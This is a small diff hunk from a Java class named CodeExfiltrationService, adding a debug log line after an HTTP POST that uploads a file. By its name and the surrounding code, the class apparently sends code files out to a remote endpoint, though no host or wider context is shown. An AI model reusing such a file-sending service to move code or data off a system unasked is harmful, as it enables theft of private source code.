@@ -60,6 +60,7 @@ public class CodeExfiltrationService {
         post.setEntity(entity.build());
         try {
             final HttpResponse response = client.execute(post);
+            LOG.debug(String.format("Sent file [%s]: %s", file.getName(), response.getStatusLine().getStatusCode()));
         } catch (final IOException e) {
             LOG.error("IOException while trying to execute POST request", e);
         }
